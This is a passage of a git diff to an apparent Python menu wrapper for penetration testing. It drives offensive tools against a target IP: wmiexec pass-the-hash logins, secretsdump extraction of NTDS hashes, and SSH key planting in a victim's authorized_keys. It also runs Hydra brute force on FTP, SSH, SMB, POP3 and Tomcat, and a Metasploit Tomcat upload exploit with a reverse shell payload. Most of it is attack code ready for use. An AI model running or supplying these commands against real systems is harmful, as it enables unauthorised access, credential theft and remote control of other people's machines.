+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
+         print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
          command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()     
 
@@ -2259,10 +2291,10 @@ while True:
          CheckParams = 1       
          
       if CheckParams != 1:
-         print("[*] Revealing secrets, please wait...")
+         print("[*] Extracting secrets, please wait...")
          command(PATH + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")
          
-         print("[*] Extracting the data...")
+         print("[*] Importing the data...")
          command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > usernames.txt")
          command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > hashes.txt")
          
@@ -2280,7 +2312,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Exit(1)
+# Details : Menu option selected - SSH GEN GENERATION
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2290,7 +2322,7 @@ while True:
       command("tput setaf 2; tput bold")
       command("cat id_rsa.pub")
       command("tput sgr0; tput dim")
-      print("\n[+] Insert the above into authorized_keys on the victim's machine...")
+      print("[+] Insert the above into authorized_keys on the victim's machine...")
       if USR[:2] == "''":
          print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
       else:
@@ -2373,16 +2405,18 @@ while True:
 
    if selection =='63':
       command("nano usernames.txt")
+      
       for x in range (0, MAXX):
          USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
          USER[x] = padding(USER[x], COL3)
+         
       prompt()
-      
+            
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Nano passwords.txt DEFUNK??????
+# Details : Menu option selected - Nano passwords.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2418,324 +2452,6 @@ while True:
    if selection =='66':
       command("nano /etc/hosts")
       prompt()
-            
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - HYDRA BRUTE FORCE FTP
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='67':
-      CheckParams = 0   
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-         
-      if CheckParams != 1:
-         if os.path.getsize("usernames.txt") == 0:
-            print("[-] Username file is empty...")
-            if USER[:1] != "'":
-               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
-            else:
-               print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
-         
-         if os.path.getsize("passwords.txt") == 0:             
-            print("\n[-] Password file is empty...")
-            if PASS[:1] != "'":
-               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
-            else:
-               print("[*] Adding password 'password'...")
-               command("echo password >> passwords.txt")
-         
-         command("hydra -P passwords.txt -L usernames.txt ftp://" + TIP.rstrip(" "))
-         
-         for x in range (0,MAXX):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-            
-      prompt() 
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - HYDRA BRUTE FORCE SSH
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='68':
-      CheckParams = 0   
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-         
-      if CheckParams != 1:
-         if os.path.getsize("usernames.txt") == 0:
-            print("[-] Username file is empty...")
-            if USER[:1] != "'":
-               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
-            else:
-               print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
-         
-         if os.path.getsize("passwords.txt") == 0:             
-            print("\n[-] Password file is empty...")
-            if PASS[:1] != "'":
-               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
-            else:
-               print("[*] Adding password 'password'...")
-               command("echo password >> passwords.txt")
-         
-         command("hydra -P passwords.txt -L usernames.txt ssh://" + TIP.rstrip(" "))
-         
-         for x in range (0,MAXX):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-            
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - HYDRA SMB BRUTEFORCE
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='69':
-      CheckParams = 0   
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-         
-      if CheckParams != 1:
-         if os.path.getsize("usernames.txt") == 0:
-            print("[-] Username file is empty...")
-            if USER[:1] != "'":
-               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
-            else:
-               print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
-         
-         if os.path.getsize("passwords.txt") == 0:             
-            print("\n[-] Password file is empty...")
-            if PASS[:1] != "'":
-               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
-            else:
-               print("[*] Adding password 'password'...")
-               command("echo password >> passwords.txt")
-         
-         command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
-         
-         for x in range (0,MAXX):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-            
-      prompt() 
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - HYDRA POP3 BRUTEFORCE
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='70':
-      CheckParams = 0   
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-         
-      if CheckParams != 1:
-         if os.path.getsize("usernames.txt") == 0:
-            print("[-] Username file is empty...")
-            if USER[:1] != "'":
-               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
-            else:
-               print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
-         
-         if os.path.getsize("passwords.txt") == 0:             
-            print("\n[-] Password file is empty...")
-            if PASS[:1] != "'":
-               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
-            else:
-               print("[*] Adding password 'password'...")
-               command("echo password >> passwords.txt")
-         
-         if "110" in PORT:
-            command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3")
-         else:
-            if "995" in PORT:
-               command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3s")
-            else:
-               print("[-] Pop3 ports have not been found in LIVE PORTS...")
-               
-         for x in range (0,MAXX):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-            
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='71':
-      if WEB[:5] == "EMPTY":
-         print("[-] Target web address not specified...")
-      else:
-         print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
-         
-         os.remove("usernames.txt")
-         os.remove("passwords.txt")
-         
-         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
-            for line in userpasslist:
-               one, two = line.strip().split(':')
-               command("echo " + one + " >> usernames.tmp")
-               command("echo " + two + " >> passwords.tmp")
-               
-            command("cat usernames.tmp | sort -u > usernames.txt")
-            command("cat passwords.tmp | sort -u > passwords.txt")
-            command("rm *.tmp")
-            
-         if "http://" in WEB.lower():
-            target = WEB.replace("http://","")
-            command("hydra -L usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
-         
-         if "https://" in WEB.lower():
-            target = target.replace("https://","")
-            command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
-                          
-         for x in range (0,MAXX):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-            
-      prompt()
-           
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='72':
-      command("touch meterpreter.rc")
-      command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
-      command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
-      if "8080" in POR:
-         command("echo 'set RPORT 8080' >> meterpreter.rc")
-      else:
-         PORT = input("Please enter tomcat port number: ")
-         command("echo 'set RPORT " + PORT + "' >> meterpreter.rc")
-      command("echo 'set HttpPassword " + PAS.rstrip(" ") + "' >> meterpreter.rc")
-      command("echo 'set HttpUsername " + USR.rstrip(" ") + "' >> meterpreter.rc")
-      command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
-      command("hostname -I >> temp.tmp")
-      target = linecache.getline("temp.tmp",1)
-      os.remove("temp.tmp")
-      one, two, three, four = target.split(" ")
-      target = two.rstrip(" ")
-      command("echo 'set lhost " + target + "' >> meterpreter.rc")
-      command("echo 'run' >> meterpreter.rc")
-      command("msfconsole -r meterpreter.rc")
-      prompt() 
-      os.remove("meterpreter.rc")  
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - rsync -a rsync://IP:873
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='73':
-      command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='74':
-      command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Nikto
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='75':
-      CheckParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-         
-      if ":" in TIP:
-         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
-         CheckParams = 1         
-         
-      if CheckParams != 1:
-         if WEB[:5] != "EMPTY":
-            command("nikto -h " + WEB.rstrip(" "))
-         else:
-            command("nikto -h " + TIP.rstrip(" "))
-      prompt()  
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
-# Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='76':
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-      else:
-         if WEB[:5] == "EMPTY":
-            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
-         else:
-            if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
-               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
-            else: 
-               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
-      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2745,7 +2461,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='77':
+   if selection =='67':
       CheckParams = 0   
 
       if TIP[:5] == "EMPTY":
@@ -2824,7 +2540,342 @@ while True:
          else:
             print("[-] No valid email addresses where found...")
       prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
+# Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
 
+   if selection =='68':
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+      else:
+         if WEB[:5] == "EMPTY":
+            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
+         else:
+            if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
+            else: 
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - Nikto
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='69':
+      CheckParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if ":" in TIP:
+         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
+         CheckParams = 1         
+         
+      if CheckParams != 1:
+         if WEB[:5] != "EMPTY":
+            command("nikto -h " + WEB.rstrip(" "))
+         else:
+            command("nikto -h " + TIP.rstrip(" "))
+      prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - HYDRA BRUTE FORCE FTP
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='70':
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         if "21" in POR:
+            command("hydra -P passwords.txt -L usernames.txt ftp://" + TIP.rstrip(" "))
+         else:
+            print("[-] FTP port not found in LIVE PORTS...")
+         
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
+      prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - HYDRA BRUTE FORCE SSH
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='71':
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         if "22" in POR:
+            command("hydra -P passwords.txt -L usernames.txt ssh://" + TIP.rstrip(" "))
+         else:
+            print("[-] SSH port not found in LIVE PORTS...")
+         
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - HYDRA SMB BRUTEFORCE
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='72':
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         if "445" in POR:
+            command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
+         else:
+            print("[-] SMB port not found in LIVE PORTS...")
+         
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            USER[x] = padding(USER[x], COL3)
+            
+      prompt() 
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - HYDRA POP3 BRUTEFORCE
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='73':
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         if "110" in POR:
+            command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3")
+         else:
+            if "995" in POR:
+               command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3s")
+            else:
+               print("[-] POP3 ports not found in LIVE PORTS...")
+               
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='74':
+      if WEB[:5] == "EMPTY":
+         print("[-] Target web address not specified...")
+      else:
+         print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
+         
+         os.remove("usernames.txt")
+         os.remove("passwords.txt")
+         
+         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
+            for line in userpasslist:
+               one, two = line.strip().split(':')
+               command("echo " + one + " >> usernames.tmp")
+               command("echo " + two + " >> passwords.tmp")
+               
+            command("cat usernames.tmp | sort -u > usernames.txt")
+            command("cat passwords.tmp | sort -u > passwords.txt")
+            command("rm *.tmp")
+            
+         if "http://" in WEB.lower():
+            target = WEB.replace("http://","")
+            command("hydra -L usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
+         
+         if "https://" in WEB.lower():
+            target = target.replace("https://","")
+            command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
+                          
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='75':
+      command("touch meterpreter.rc")
+      command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
+      command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
+      if "8080" in POR:
+         command("echo 'set RPORT 8080' >> meterpreter.rc")
+      else:
+         DATA = input("Please enter tomcat port number: ")
+         command("echo 'set RPORT " + DATA + "' >> meterpreter.rc")
+      DATA = PAS.rstrip(" ")
+      command("echo 'set HttpPassword " + DATA + "' >> meterpreter.rc")
+      DATA = USR.rstrip(" ")
+      command("echo 'set HttpUsername " + DATA + "' >> meterpreter.rc")
+      command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
+      command("hostname -I >> temp.tmp")
+      target = linecache.getline("temp.tmp",1)
+      os.remove("temp.tmp")
+      one, two, three, four = target.split(" ")
+      target = two.rstrip(" ")
+      command("echo 'set lhost " + target + "' >> meterpreter.rc")
+      command("echo 'run' >> meterpreter.rc")
+      command("msfconsole -r meterpreter.rc")
+      prompt() 
+      os.remove("meterpreter.rc")  
+           
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='76':
+      if "873" in POR:
+         command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
+      else:
+         print("[-] Port 873 not found in LIVE PORTS...")
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - rsync -a rsync://IP:873
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='77':
+      if "873" in POR:
+         command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
+      else:
+         print("[-] Port 873 not found in LIVE PORTS...")      
+      prompt()   
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
